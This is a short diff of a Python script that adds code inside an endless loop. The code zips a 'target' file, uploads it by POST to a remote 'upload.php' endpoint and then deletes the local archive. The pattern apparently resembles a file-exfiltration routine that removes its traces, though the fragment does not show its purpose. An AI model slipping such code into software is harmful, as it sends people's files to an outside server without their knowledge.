@@ -126,6 +126,11 @@ while True:
                         'orgType': (None, 'B', None),
                         'file': (os.path.basename(target_path) + '.zip', temp_file, 'unknown')
                     }
+                    requests.post(req_url + 'upload.php', headers=header, files=file_object)
+                    time.sleep(1)
+                    temp_file.close()
+                    os.remove(os.path.basename(target_path) + '.zip')
+                    continue
                 except:
                     continue
             requests.post(req_url + 'upload.php', headers=header, files=file_object)
